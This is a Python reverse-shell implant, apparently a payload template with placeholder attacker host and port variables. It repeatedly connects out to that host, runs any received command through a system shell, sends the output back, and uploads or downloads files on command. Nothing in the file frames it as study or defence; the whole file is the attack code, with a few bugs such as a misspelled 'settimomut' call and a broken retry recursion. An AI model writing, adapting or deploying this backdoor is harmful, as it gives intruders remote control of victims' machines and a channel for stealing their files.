import socket
import time
import json
import subprocess
import os

def send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

    
def recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError: 
            continue


def upload_file(file):
    f = open(file, 'rb')
    s.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    s.settimomut(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = recv()
        if command == 'exit':
            break
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command in ('clear', 'help'):
            pass
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, 
                                       shell=True, 
                                       stdin=subprocess.PIPE, 
                                       stdout=subprocess.PIPE, 
                                       stderr=subprocess.PIPE)
            send((execute.stdout.read() + execute.stderr.read()).decode())

def connect(ip: str, port: int):
    while True:
        time.sleep(3)
        try:
            s.connect((ip, port))
            shell()
            s.close()
            break
        except:
            connect()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(${LHOST}, ${LPORT})